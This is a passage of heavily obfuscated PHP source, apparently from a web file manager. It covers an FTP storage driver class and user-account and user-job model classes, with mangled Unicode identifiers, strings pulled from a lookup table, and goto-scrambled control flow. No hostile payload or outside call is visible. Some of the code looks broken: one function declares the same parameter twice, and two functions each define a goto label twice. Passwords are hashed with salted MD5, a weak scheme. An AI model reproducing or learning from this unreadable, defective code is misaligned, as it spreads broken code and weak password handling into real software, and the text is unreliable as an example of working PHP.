$Aܑ[1205] => $EЏ۝, $Aܑ[1206] => $cп, $Aܑ[173] => $this->getHost()); return $Aے; goto bȣˬ; EΜ: $E͆ = $Aܑ[59]; $e = gmdate($Aܑ[1190]); $dٟ = gmdate($Aܑ[700]); goto b; bȣˬ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Cӌ) { parent::__construct(); if (count($Cӌ) > 0) { $this->_init($Cӌ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d) { $C =& $_SERVER[Ť]; global $config; $this->appCharset = $config[$C[1207]]; $this->systemCharset = $config[$C[1208]]; if (isset($d[$C[1209]]) && $d[$C[1209]]) { $this->systemCharset = $d[$C[1209]]; } } public function iconvApp($e) { return $this->iconvTo($e, $this->systemCharset, $this->appCharset); } public function iconvSystem($F) { return $this->iconvTo($F, $this->appCharset, $this->systemCharset); } public function getPathOuter($fߗ͐ٲ) { goto C; Bގ: $fߗ͐ٲ = KodIO::clear($fߗ͐ٲ); $fߗ͐ٲ = substr($fߗ͐ٲ, strlen($E)); if (empty($this->pathDriver)) { return $fߗ͐ٲ; } goto c; dΒ: if (substr($E, 0, 2) == $E[1210]) { $E = BASIC_PATH . substr($E, 2); } if (substr($fߗ͐ٲ, 0, 2) == $E[1210]) { $fߗ͐ٲ = BASIC_PATH . substr($fߗ͐ٲ, 2); } $E = KodIO::clear($E); goto Bގ; C: $E =& $_SERVER[Ť]; $E = $this->iconvApp($this->pathBase); $fߗ͐ٲ = $this->iconvApp($fߗ͐ٲ); goto dΒ; c: return $this->pathDriver . $E[8] . ltrim($fߗ͐ٲ, $E[8]); goto bᡪ; bᡪ: } private function _init($B = array()) { $D揨搞 =& $_SERVER[Ť]; if (!function_exists($D揨搞[1211])) { throw new Exception(LNG($D揨搞[1212])); } $this->config = $B; $this->charsetReset($B); foreach ($B as $b => $A) { if (isset($this->{$b})) { $this->{$b} = $A; } } return $this->_login($B); } private function _login($fʍ) { goto Bް; Bް: $F =& $_SERVER[Ť]; static $b = array(); $b롮 = md5(json_encode($fʍ)); goto C٬; C٬: if (isset($b[$b롮])) { foreach ($b[$b롮] as $D => $f伾Մ) { $this->{$D} = $f伾Մ; } return !0; } $a = parse_url(trim($this->server, $F[8])); $this->host = $a[$F[173]]; goto c㧹; c㧹: $C¶ = isset($a[$F[172]]) && $a[$F[172]] == $F[1213] ? !0 : !1; $this->scheme = $C¶ ? $F[1214] : $F[1215]; $this->port = isset($a[$F[174]]) ? $a[$F[174]] : 21; goto B׫Ӑ; Bև: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $aݸ = $this->pasv == $F[83] ? !0 : !1; @ftp_pasv($this->connect, $aݸ); goto dìϤ; dìϤ: $b[$b롮] = array($F[1216] => $this->connect, $F[173] => $this->host, $F[172] => $this->scheme, $F[174] => $this->port); return $EƔ; goto A㲼; B׫Ӑ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $EƔ = @ftp_login($this->connect, $this->username, $this->userpass); goto Bև; A㲼: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($eæģ, $F҄ʮ = '', $d돎Ǉ = REPEAT_RENAME) { if ($this->setContent($eæģ, $F҄ʮ)) { return $this->getPathOuter($eæģ); } return !1; } public function mkdir($fΦ֌, $aڌ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $fΦ֌ = $this->iconvSystem($fΦ֌); if ($this->_isFolder($fΦ֌) || @ftp_mkdir($this->connect, $fΦ֌)) { return $this->getPathOuter($fΦ֌); } if (!$this->mkdir($this->pathFather($fΦ֌))) { return !1; } if ($fΦ֌ = @ftp_mkdir($this->connect, $fΦ֌)) { return $this->getPathOuter($fΦ֌); } return !1; } public function copyFile($CĎ, $aɭ͟) { goto e˔; e˔: if (!$this->_isconn()) { return !1; } $cփ = $this->pathThis($this->iconvSystem($CĎ)); $e힟 = $this->tempFile($cփ); goto F܍; C銳: $this->tempFileRemve($e힟); return $aˑ; goto f皍܈; F܍: $dǋ = $this->iconvApp($e힟); $this->download($CĎ, $dǋ); $aˑ = $this->upload($aɭ͟, $dǋ); goto C銳; f皍܈: } public function moveFile($d, $dȂ) { if (!$this->_isconn()) { return !1; } $d = $this->iconvSystem($d); $dȂ = $this->iconvSystem($dȂ); $AюҘ = @ftp_rename($this->connect, $d, $dȂ); return $AюҘ ? $this->getPathOuter($dȂ) : !1; } public function delFile($CǶ) { if (!$this->_isconn()) { return !1; } $CǶ = $this->iconvSystem($CǶ); return @ftp_delete($this->connect, $CǶ); } public function delFolder($aͥ) { goto eӉٟ; eуߎ: foreach ($d敫 as $A̒ɮ) { $A̒ɮ = $this->iconvSystem($A̒ɮ); $Bϛ͵ = @ftp_rmdir($this->connect, $A̒ɮ); if (!$Bϛ͵) { return !1; } } $aͥ = $this->iconvSystem($aͥ); return @ftp_rmdir($this->connect, $aͥ); goto C㉃; fݡ: $this->fileList($aͥ, $d敫, $cاŇ, !0); $this->listItemCache = !0; foreach ($cاŇ as $d垓) { $A̒ɮ = $this->iconvSystem($d垓[$_SERVER[Ť][28]]); $Bϛ͵ = @ftp_delete($this->connect, $A̒ɮ); if (!$Bϛ͵) { return !1; } } goto eуߎ; eӉٟ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $d敫 = $cاŇ = array(); goto fݡ; C㉃: } public function rename($e, $e) { goto EޛȨܦ; cԆϖ: return $E ? $this->getPathOuter($dޮ) : !1; goto eϒ; eȝ: $dޮ = rtrim($dԙ, $f[8]) . $f[8] . $bۥ̯; $E = @ftp_rename($this->connect, $e, $dޮ); $dޮ = $this->iconvApp($dޮ); goto cԆϖ; EޛȨܦ: $f =& $_SERVER[Ť]; if (!$this->_isconn()) { return !1; } $bۥ̯ = $this->fileNameAuto($this->pathFather($e), $e); goto C߂; C߂: $bۥ̯ = $this->iconvSystem($bۥ̯); $e = $this->iconvSystem($e); $dԙ = $this->pathFather($e); goto eȝ; eϒ: } private function folderInfo($F, $a = false) { $Cǽ =& $_SERVER[Ť]; $D坩 = array($Cǽ[28] => $this->pathThis($F), $Cǽ[75] => $this->getPathOuter($Cǽ[8] . $F), $Cǽ[29] => $Cǽ[76]); if ($a) { return $D坩; } $D坩[$Cǽ[190]] = $D坩[$Cǽ[107]] = 0; $D坩[$Cǽ[191]] = $D坩[$Cǽ[192]] = !0; return $D坩; } private function fileInfo($bێ鏈, $c푵 = false, $A = array()) { goto FǏ; a˿: $A[$BМ쬠[190]] = $A[$BМ쬠[107]] = 0; $A[$BМ쬠[191]] = $A[$BМ쬠[192]] = !0; $bֿ = $this->iconvSystem($bێ鏈); goto a; a: $A[$BМ쬠[107]] = @ftp_mdtm($this->connect, $bֿ); if (empty($A)) { $A = $this->objectMeta($bێ鏈); if (!$A) { return $A; } } $A[$BМ쬠[77]] = $A[$BМ쬠[77]]; goto F; FǏ: $BМ쬠 =& $_SERVER[Ť]; $A = array($BМ쬠[28] => $this->pathThis($bێ鏈), $BМ쬠[75] => $this->getPathOuter($BМ쬠[8] . $bێ鏈), $BМ쬠[29] => $BМ쬠[171], $BМ쬠[77] => isset($A[$BМ쬠[77]]) ? $A[$BМ쬠[77]] : 0, $BМ쬠[165] => $this->ext($bێ鏈)); if ($c푵) { return $A; } goto a˿; F: return $A; goto Bԕ; Bԕ: } public function size($aъ) { $d = $this->objectMeta($aъ); return $d ? $d[$_SERVER[Ť][77]] : 0; } public function info($AϢ) { if ($this->isFile($AϢ)) { return $this->fileInfo($AϢ, 0); } else { if ($this->isFolder($AϢ)) { return $this->folderInfo($AϢ); } } return !1; } private function fileList($e, &$b, &$aٕ, $d = false) { goto FՄ; aЧѮ: @ftp_chdir($this->connect, $B󓂎[8]); $e = rtrim($e, $B󓂎[8]) . $B󓂎[8]; check_abort(); goto c; FՄ: $B󓂎 =& $_SERVER[Ť]; $e = $this->iconvSystem($e); if (!$this->isFolder($e)) { return !1; } goto aЧѮ; c: $e = $this->listItemCache === !1 ? !1 : !0; $bԝ = @ftp_rawlist($this->connect, $e); if (!$bԝ) { $bԝ = array(); } goto Aѫ; Aѫ: $F = array($B󓂎[91] => 1, $B󓂎[1217] => 1); foreach ($bԝ as $aԔ) { goto Bﭱ; d: if ($b) { $b[] = $E׮հ; if ($d) { $this->fileList($E׮հ, $b, $aٕ, $d); } continue; } $aٕ[] = $fΠֺ; goto BǮ; B톚֢: if (substr($aԔ, 0, 1) == $B󓂎[1218]) { $fΠֺ[$B󓂎[29]] = $B󓂎[76]; $fΠֺ[$B󓂎[77]] = 0; } $b = $fΠֺ[$B󓂎[29]] == $B󓂎[76] ? !0 : !1; if ($e) { $this->cacheMethod($B󓂎[195], $E׮հ, $b); $this->cacheMethod($B󓂎[196], $E׮հ, $fΠֺ); } goto d; e΅: if (!$E׮հ || isset($F[$E׮հ])) { continue; } $E׮հ = $this->iconvApp($e . ltrim($E׮հ, $B󓂎[8])); $fΠֺ = array($B󓂎[28] => $E׮հ, $B󓂎[29] => $B󓂎[171], $B󓂎[77] => $E[4]); goto B톚֢; Bﭱ: $E = $this->_listItem($aԔ); if ($E[0] == $B󓂎[705]) { continue; } $E׮հ = $E[8]; goto e΅; BǮ: } if ($e) { $this->cacheMethod($B󓂎[195], $e, !0); } goto a; a: } private function _listItem($F) { if (empty($F)) { return array(); } $a吾 = preg_split($_SERVER[Ť][1219], $F); if (count($a吾) <= 9) { return $a吾; } $a吾[8] = trim(substr($F, strpos($F, $a吾[7]) + strlen($a吾[7]))); return array_splice($a吾, 0, 9); } public function listPath($FԿ, $c = false) { goto Dߦ; FȎ: $this->fileList($FԿ, $E싘, $eܩܴ); foreach ($E싘 as $e => $e硙) { $E싘[$e] = $this->folderInfo($e硙, $c); } foreach ($eܩܴ as $e => $e硙) { $eܩܴ[$e] = $this->fileInfo($e硙[$cʲ[28]], $c, $e硙); } goto C; C: return array($cʲ[74] => $E싘, $cʲ[73] => $eܩܴ); goto Fջж; Dߦ: $cʲ =& $_SERVER[Ť]; if (!$this->_isconn()) { return !1; } $E싘 = $eܩܴ = array(); goto FȎ; Fջж: } public function has($b䌰, $d͂ = false, $eٟ = true) { goto Fװٗ; eٹ: $this->fileList($b䌰, $C, $Fȡ, $c); if ($d͂) { return array($fϤ[199] => count($Fȡ), $fϤ[200] => count($C)); } if ($eٟ) { if (count($Fȡ)) { return !0; } } else { if (count($C)) { return !0; } } goto d; d: return !1; goto Eإ; Fװٗ: $fϤ =& $_SERVER[Ť]; $C = $Fȡ = array(); $c = $d͂ ? !0 : !1; goto eٹ; Eإ: } public function listAll($e) { goto E; eݕ: foreach ($B듍 as $A藜) { if (is_string($A藜)) { $d㎛[$A藜] = 0; } } return $this->listAllFiles($e, array_keys($d㎛), $d㎛); goto e԰; A: $this->fileList($e, $B듍, $Dé, !0); $d㎛ = array(); foreach ($Dé as $A藜) { $d㎛[$A藜[$e˫[28]]] = $A藜[$e˫[77]]; } goto eݕ; E: $e˫ =& $_SERVER[Ť]; if (!$this->_isconn()) { return !1; } $B듍 = $Dé = array(); goto A; e԰: } public function getContent($c숹҂) { if (!$this->_isconn()) { return !1; } $c숹҂ = $this->iconvSystem($c숹҂); return $this->fileSubstr($c숹҂); } public function setContent($Dʛ, $bݸ = '') { goto ä; Eֲ: file_put_contents($e諆, $bݸ); $AޕҎ = $this->upload($Dʛ, $this->iconvApp($e諆)); $this->tempFileRemve($e諆); goto F; F: return $AޕҎ; goto Aɱ; ä: if (!$this->_isconn()) { return !1; } $bՒ = $this->pathThis($this->iconvSystem($Dʛ)); $e諆 = $this->tempFile($bՒ); goto Eֲ; Aɱ: } public function fileSubstr($d, $Cɛͯ = 0, $f = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($d, $Cɛͯ, $f); } private function ftpRequest($D͇, $cꛅ = 0, $dƖ = false) { goto Eބ셹; bۂѡ: curl_setopt($d܏, CURLOPT_URL, $e֡ . $this->pathEncode($D͇)); curl_setopt($d܏, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($dƖ) { $fěڣ = $cꛅ + $dƖ - 1; curl_setopt($d܏, CURLOPT_RANGE, "{$cꛅ}\55{$fěڣ}"); } goto A̽; Eބ셹: $D͇ = $this->iconvSystem($D͇); $e֡ = $this->scheme . $this->host . $_SERVER[Ť][4] . $this->port; $d܏ = curl_init(); goto bۂѡ; d̕: return $fܣ; goto F; A̽: curl_setopt($d܏, CURLOPT_RETURNTRANSFER, 1); $fܣ = curl_exec($d܏); curl_close($d܏); goto d̕; F: } public function upload($cͲ, $B賿, $D = false, $A░ = REPEAT_REPLACE) { goto d; d: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($cͲ))) { return !1; } $cͲ = $this->iconvSystem($cͲ); goto c; c: $B賿 = $this->iconvSystem($B賿); $b = ftp_nb_put($this->connect, $cͲ, $B賿, FTP_BINARY); while ($b == FTP_MOREDATA) { $b = ftp_nb_continue($this->connect); } goto F蓯; F蓯: if ($b != FTP_FINISHED) { return !1; } return $this->getPathOuter($cͲ); goto dՊ錕; dՊ錕: } public function download($f, $Fʡ = '') { goto eŊʺ; f: $f = $this->iconvSystem($f); $Fʡ = $this->iconvSystem($Fʡ); $f߅ = ftp_nb_get($this->connect, $Fʡ, $f, FTP_BINARY); goto f; f: while ($f߅ == FTP_MOREDATA) { $f߅ = ftp_nb_continue($this->connect); } if ($f߅ != FTP_FINISHED) { return !1; } return $this->iconvApp($Fʡ); goto D؝; eŊʺ: if (!$this->_isconn()) { return !1; } $A = $this->pathFather($Fʡ); if (!IO::mkdir($A)) { return !1; } goto f; D؝: } public function exist($Dƪ) { return $this->isFile($Dƪ) || $this->isFolder($Dƪ); } public function isFile($dޗɽ) { return !$this->isFolder($dޗɽ) && $this->objectMeta($dޗɽ); } public function isFolder($F) { return $this->cacheMethod($_SERVER[Ť][195], $F); } protected function objectMeta($a) { return $this->cacheMethod($_SERVER[Ť][196], $a); } protected function _objectMeta($Cȣ) { goto B衏; B衏: $Fӝܰ =& $_SERVER[Ť]; if ($Cȣ == $Fӝܰ[33] || $Cȣ == $Fӝܰ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto A; A: $Cȣ = $this->iconvSystem($Cȣ); $F = array($Fӝܰ[28] => $this->iconvApp($Cȣ), $Fӝܰ[29] => $Fӝܰ[171], $Fӝܰ[77] => 0); @ftp_chdir($this->connect, $Fӝܰ[8]); goto e; e: $aƛ = @ftp_size($this->connect, $Cȣ); if ($aƛ != -1) { $F[$Fӝܰ[77]] = $aƛ; } else { $b = @ftp_chdir($this->connect, $Cȣ); if (!$b) { return !1; } $F[$Fӝܰ[29]] = $Fӝܰ[76]; } return $F; goto Fͤ; Fͤ: } protected function _isFolder($fΞÈ) { $E =& $_SERVER[Ť]; if ($fΞÈ == $E[33] || $fΞÈ == $E[8]) { return !0; } $fݚŒ = $this->_objectMeta($fΞÈ); return isset($fݚŒ[$E[29]]) && $fݚŒ[$E[29]] == $E[76] ? !0 : !1; } } goto EȌ; cԏ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x6a\157\x62\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\144\x65\x73\143", "\x73\x6f\162\164"); const JOB_KEY = "\x73\145\154\x66\112\x6f\x62\x4c\x69\x73\x74"; public function listData($eՖ = false, $c = "\x73\157\x72\164", $cĎ = false) { return parent::listData($eՖ, $c, $cĎ); } public function remove($dˣ) { return parent::remove($dˣ); } public function add($F܊) { $bŐԲ =& $_SERVER[Ť]; if ($this->findByName($F܊[$bŐԲ[28]])) { return !1; } $F܊[$bŐԲ[1675]] = $this->getSort(); return parent::insert($F܊); } private function getSort() { $A² =& $_SERVER[Ť]; $Aϴ݊ = parent::listData(); $aÐѡ = array_to_keyvalue($Aϴ݊, $A²[33], $A²[1675]); return empty($aÐѡ) ? 0 : max($aÐѡ) + 1; } public function update($B̶Ό, $fԱ) { $a飿ǜ =& $_SERVER[Ť]; $c៝ = parent::listData($B̶Ό); $fջӍ = $this->findByName($fԱ[$a飿ǜ[28]]); if (!$c៝ || $fջӍ && $fջӍ[$a飿ǜ[383]] != $c៝[$a飿ǜ[383]]) { return !1; } return parent::update($B̶Ό, $fԱ); } public function setUserJob($f뭬, $D) { goto F; e: $fۿ = rtrim($fۿ, $fʹۣ[47]); Model($fʹۣ[494])->metaSet($f뭬, self::JOB_KEY, $fۿ); goto cƷ; F: $fʹۣ =& $_SERVER[Ť]; if (!is_array($D)) { $D = array($D); } $F䉸 = parent::listData(); goto A⸠; A⸠: $Fףѫ = array_to_keyvalue($F䉸, $fʹۣ[28]); $fۿ = $fʹۣ[368]; foreach ($D as $eח) { if ($Fףѫ[$eח]) { $fۿ .= $Fףѫ[$eח][$fʹۣ[383]] . $fʹۣ[47]; } else { $e߸ = $this->add($eח); $fۿ .= $e߸ . $fʹۣ[47]; } } goto e; cƷ: } public function getUserJob($E) { $F = Model($_SERVER[Ť][494])->metaGet($E); return $this->getUserJobInfo($F[self::JOB_KEY]); } public function getUserJobInfo($Cһ) { goto Fԩ; c: $eΈ = array_remove_key($eΈ, $C[190]); $F◷ = array(); foreach ($eӌ as $FÆ) { if (isset($eΈ[$FÆ])) { $F◷[] = $eΈ[$FÆ]; } } goto cְŹ; cְŹ: return $F◷; goto E; Fԩ: $C =& $_SERVER[Ť]; $eӌ = explode($C[47], $Cһ); $eΈ = parent::listData(); goto c; E: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\145" => "\x75\x73\x65\162\x5f\x6d\x65\164\x61", "\155\x65\x74\141\x46\x69\145\154\144" => "\x75\x73\145\x72\x49\104"); protected $simpleField = "\x75\x73\145\x72\x49\x44\54\x6e\151\143\153\x4e\x61\x6d\x65\54\x6e\141\155\145\x2c\x61\x76\141\164\x61\x72\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($dሐ) { $E =& $_SERVER[Ť]; $BזΊ = $E[2070]; return array($E[1725] => array($dሐ[0], $BזΊ), $E[1727] => array($dሐ[0], $BזΊ), $E[2071] => array($dሐ[0], $BזΊ)); } protected function getInfo($Fí܇, $bǴ = false) { $e = $this->getInfoSimple($Fí܇); if (!is_array($e)) { return array(); } if ($bǴ) { return $this->_getInfoApply($e); } return $this->cacheFunctionGet($_SERVER[Ť][1781], $Fí܇); } protected function getInfoFull($e嘔ܤ, $E樖ȍ = false) { $E֬ = $this->getInfoSimple($e嘔ܤ); if (!is_array($E֬)) { return array(); } if ($E樖ȍ) { return $this->_getInfoApply($E֬, !0); return $this->_getInfoApply($E֬, !0); } return $this->cacheFunctionGet($_SERVER[Ť][2072], $e嘔ܤ); } private function _getInfoApply($d⹌, $a = false) { goto Eڕ; Eڕ: $F =& $_SERVER[Ť]; if (!$d⹌) { return $d⹌; } $a = md5($F[2073] . $d⹌[$F[820]] . $F[2074] . $d⹌[$F[28]]); goto B嚬׎; bň: $d⹌[$F[407]][$F[1913]] = isset($F[$F[1914]]) ? $F[$F[1914]] : null; if ($a) { $d⹌[$F[433]] = $this->metaGet($d⹌[$F[1493]]); } return $d⹌; goto aǲţ; B嚬׎: $d⹌ = $this->_listDataApplyItem($d⹌); $F = Model($F[1172])->metaGet($d⹌[$F[407]][$F[385]]); $d⹌[$F[2075]] = $a; goto bň; aǲţ: } protected function getInfoSimple($dވ, $E = false) { $EԻЮ =& $_SERVER[Ť]; if (!$dވ) { return array(); } if ($E) { $b҄ = $this->where(array($EԻЮ[1493] => intval($dވ)))->find(); if (!is_array($b҄)) { return array(); } $b҄[$EԻЮ[2076]] = Action($EԻЮ[2077])->parseUrl($b҄[$EԻЮ[2076]]); return $b҄; } return $this->cacheFunctionGet($EԻЮ[1728], $dވ); } protected function getInfoSimpleOuter($A) { goto B腧; E۱: $Cʧ = array_field_key($b, explode($F𱈞[47], $this->simpleField)); if (!$Cʧ) { return array($F𱈞[1493] => $F𱈞[1055], $F𱈞[28] => $F𱈞[157] . LNG($F𱈞[2080]) . $F𱈞[493], $F𱈞[2076] => STATIC_PATH . $F𱈞[2081]); } $Cʧ[$F𱈞[2076]] = Action($F𱈞[2077])->parseUrl($Cʧ[$F𱈞[2076]]); goto dًՐ; B腧: $F𱈞 =& $_SERVER[Ť]; if (!$A || $A == 0) { return array($F𱈞[1493] => $F𱈞[485], $F𱈞[28] => $F𱈞[157] . LNG($F𱈞[2078]) . $F𱈞[493], $F𱈞[2076] => STATIC_PATH . $F𱈞[2079]); } $b = $this->cacheFunctionGet($F𱈞[1728], $A); goto E۱; dًՐ: return $Cʧ; goto Bڋ; Bڋ: } protected function groupUser($E) { } public static function errorLang($eΖȾ) { $bݝ呙 =& $_SERVER[Ť]; $FΪ = array(self::ERROR_USER_NOT_EXISTS => $bݝ呙[2082], self::ERROR_USER_PASSWORD_ERROR => $bݝ呙[2083], self::ERROR_USER_EXIST_NAME => $bݝ呙[2084], self::ERROR_USER_EXIST_PHONE => $bݝ呙[2085], self::ERROR_USER_EXIST_EMAIL => $bݝ呙[2086], self::ERROR_USER_LOGIN_LOCK => $bݝ呙[2087], self::ERROR_IP_NOT_ALLOW => $bݝ呙[2088], self::ERROR_USER_EXIST_NICKNAME => $bݝ呙[2089]); return LNG($FΪ[$eΖȾ]); } public function getInfoByMeta($E猕Ь, $C샎) { $D̹Ȏ =& $_SERVER[Ť]; $Dݡ = Model($D̹Ȏ[2090])->where(array($D̹Ȏ[89] => $E猕Ь, $D̹Ȏ[366] => $C샎))->find(); if ($Dݡ) { return $this->getInfo($Dݡ[$D̹Ȏ[1493]]); } return !1; } public function userLoginCheck($E, $F) { $eὣ =& $_SERVER[Ť]; $eĕ = $this->userLoginFind($E); if (!$eĕ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($eĕ[$eὣ[1493]], $F)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($eĕ[$eὣ[1493]]); } public function userLoginFind($C܌) { $dި =& $_SERVER[Ť]; $E = array($dި[28] => $C܌, $dި[1917] => $C܌, $dި[299] => $C܌, $dި[2091] => $C܌, $dި[928] => $dި[930]); if ($this->nickNameRpt()) { unset($E[$dި[1917]]); } return $this->where($E)->find(); } public function clearCache($b؂) { $e貏Ѧ =& $_SERVER[Ť]; $this->cacheFunctionClear($e貏Ѧ[1781], $b؂); $this->cacheFunctionClear($e貏Ѧ[1728], $b؂); $this->cacheFunctionClear($e貏Ѧ[2072], $b؂); } public function userPasswordCheck($A̍, $A޽) { $FԊ =& $_SERVER[Ť]; $F = $this->where(array($FԊ[1493] => intval($A̍)))->find(); $d = $this->metaGet($A̍); $D = isset($d[$FԊ[2092]]) ? $d[$FԊ[2092]] : $FԊ[33]; if (md5($D . trim($A޽)) !== $F[$FԊ[820]]) { return !1; } return !0; } public function userAdd($aզ) { goto D׃; Aڴ: return $bڧ; goto B; cӟ: $d݉ = $this->_checkExist($aզ); if ($d݉ !== !0) { return $d݉; } $bڧ = $this->add($Cز); goto B; D׃: $F鑼 =& $_SERVER[Ť]; $Cز = array($F鑼[402] => $aզ[$F鑼[28]], $F鑼[2093] => $aզ[$F鑼[1377]], $F鑼[2094] => isset($aզ[$F鑼[299]]) ? $aզ[$F鑼[299]] : $F鑼[33], $F鑼[2095] => isset($aզ[$F鑼[2091]]) ? $aզ[$F鑼[2091]] : $F鑼[33], $F鑼[2096] => isset($aզ[$F鑼[1917]]) ? $aզ[$F鑼[1917]] : $aզ[$F鑼[28]], $F鑼[2097] => isset($aզ[$F鑼[2076]]) ? $aզ[$F鑼[2076]] : $F鑼[33], $F鑼[2098] => isset($aզ[$F鑼[2099]]) ? $aզ[$F鑼[2099]] : 1, $F鑼[2100] => $aզ[$F鑼[820]], $F鑼[1729] => isset($aզ[$F鑼[1636]]) ? $aզ[$F鑼[1636]] : 1024 * 1024 * 20, $F鑼[1730] => 0, $F鑼[2101] => 0, $F鑼[1768] => isset($aզ[$F鑼[699]]) ? $aզ[$F鑼[699]] : 1); if (!empty($aզ[$F鑼[1493]])) { $Cز[$F鑼[1493]] = $aզ[$F鑼[1493]]; } goto cӟ; B: $e = array($F鑼[2100] => $Cز[$F鑼[820]], $F鑼[2096] => $Cز[$F鑼[1917]]); $this->userEdit($bڧ, $e); Model($F鑼[1172])->userRootAdd($bڧ); goto Aڴ; B: } protected function userEditTest($c¿, $cٙ) { return $this->call($_SERVER[Ť][2102], $c¿, $cٙ); } protected function userEdit($aɉ, $f܈⪔) { goto Aޅ; B𻽌: $this->where(array($bۻ[1485] => $aɉ))->save($f܈⪔); if (isset($f܈⪔[$bۻ[1917]])) { $this->setNamePinyin($aɉ, $f܈⪔[$bۻ[1917]]); } $this->clearCache($aɉ); goto c; Aޅ: $bۻ =& $_SERVER[Ť]; $bʘ = $this->getInfoSimple($aɉ); if (!$bʘ) { return !1; } goto D蹟; D蹟: $F = $this->_checkExist($f܈⪔, $aɉ); if ($F !== !0) { return $F; } if (isset($f܈⪔[$bۻ[820]]) && trim($f܈⪔[$bۻ[820]]) != $bۻ[33]) { $dɸ켍 = $this->metaGet($aɉ); if (empty($dɸ켍[$bۻ[2092]])) { $dɸ켍[$bۻ[2092]] = rand_string(10); Model($bۻ[491])->metaSet($aɉ, $bۻ[2092], $dɸ켍[$bۻ[2092]]); } $f܈⪔[$bۻ[820]] = md5($dɸ켍[$bۻ[2092]] . trim($f܈⪔[$bۻ[820]])); } else { unset($f܈⪔[$bۻ[820]]); } goto B𻽌; c: return !0; goto e񨓰; e񨓰: } public function setNamePinyin($e, $D = false) { $dоԸ =& $_SERVER[Ť]; if (!$D) { $e = $this->getInfoSimple($e); $D = $e[$dоԸ[1917]] ? $e[$dоԸ[1917]] : $e[$dоԸ[28]]; } $Fޜ = Model($dоԸ[494]); if (!Input::check($D, $dоԸ[545])) { return $Fޜ->metaSet($e, array($dоԸ[432] => $dоԸ[33], $dоԸ[431] => $dоԸ[33])); } return $Fޜ->metaSet($e, array($dоԸ[432] => str_replace($dоԸ[50], $dоԸ[33], Pinyin::encode($D)), $dоԸ[431] => Pinyin::encode($D, $dоԸ[546]))); } private function nickNameRpt() { $Fܘ =& $_SERVER[Ť]; $C󹖥 = Model($Fܘ[1093])->get($Fܘ[2103]); $DƘՃ = $GLOBALS[$Fܘ[6]][$Fܘ[371]][$Fܘ[2103]]; $eل = !is_null($C󹖥) ? $C󹖥 : $DƘՃ; return !!$eل; } private function _checkExist($F̓, $BЄێ = false) { $f =& $_SERVER[Ť]; $c = array($f[28] => UserModel::ERROR_USER_EXIST_NAME, $f[1917] => UserModel::ERROR_USER_EXIST_NICKNAME, $f[299] => UserModel::ERROR_USER_EXIST_EMAIL, $f[2091] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($c[$f[1917]]); } $Aک = $BЄێ ? array($f[1493] => array($f[2104], $BЄێ)) : array(); foreach ($c as $dŶ؈ => $e) { $e󠱿 = array(); foreach ($c as $Eᡊ => $AΘ) { if (isset($F̓[$Eᡊ]) && $F̓[$Eᡊ]) { $e󠱿[] = $F̓[$Eᡊ]; } } if (!$e󠱿) { continue; } $Dޥ = array_merge(array($dŶ؈ => array($f[7], $e󠱿)), $Aک); $CԻ = $this->where($Dޥ)->find(); if ($CԻ) { return $e; } } return !0; } public function userListInfo($D䓲) { $c䉖ʑ =& $_SERVER[Ť]; $E҄ = array(); $D䓲 = is_array($D䓲) ? array_unique($D䓲) : array(); if (!$D䓲) { return $E҄; } if (count($D䓲) < 20) { foreach ($D䓲 as $F) { $E҄[$F . $c䉖ʑ[33]] = $this->getInfoSimpleOuter($F); } } else { $b՘ = array($c䉖ʑ[1485] => array($c䉖ʑ[400], $D䓲)); if (count($D䓲) == 1) { $b՘ = array($c䉖ʑ[1485] => $D䓲[0]); } $cҎж = Model($c䉖ʑ[491])->field($this->simpleField)->where($b՘)->select(); $cҎж = array_to_keyvalue($cҎж, $c䉖ʑ[1493]); foreach ($D䓲 as $F) { $D턵 = $cҎж[$cҎж[$F]]; if (!$D턵) { $E҄[$F . $c䉖ʑ[33]] = $this->getInfoSimpleOuter($F); continue; } $D턵[$c䉖ʑ[2076]] = Action($c䉖ʑ[2077])->parseUrl($D턵[$c䉖ʑ[2076]]); $E҄[$F . $c䉖ʑ[33]] = $D턵; } } return $E҄; } protected function userStatus($cͰ, $eѕ) { $A = $this->getInfoSimple($cͰ); if (!$A) { return !1; } $e٪ = array($_SERVER[Ť][699] => $eѕ); return $this->userEdit($cͰ, $e٪); } protected function userRemove($E) { goto D; aʼ: $cۑ = array($E[1485] => $E); Model($E[552])->where($cۑ)->delete(); Model($E[2105])->where($cۑ)->delete(); goto e; Eڻ: Model($E[768])->userRootRemove($E); return $this->where($cۑ)->delete(); goto D춒; e: Model($E[1735])->where($cۑ)->delete(); Model($E[2090])->where($cۑ)->delete(); Model($E[2106])->where($cۑ)->delete(); goto Eڻ; D: $E =& $_SERVER[Ť]; $B﫢 = $this->getInfoSimple($E); if (!$B﫢) { return !1; } goto aʼ; D춒: } protected function userGroupSet($A, $bُ͎, $C꼢 = array()) { goto a肆Ϸ; Aɏ: return $cⰺ->addAll($B, 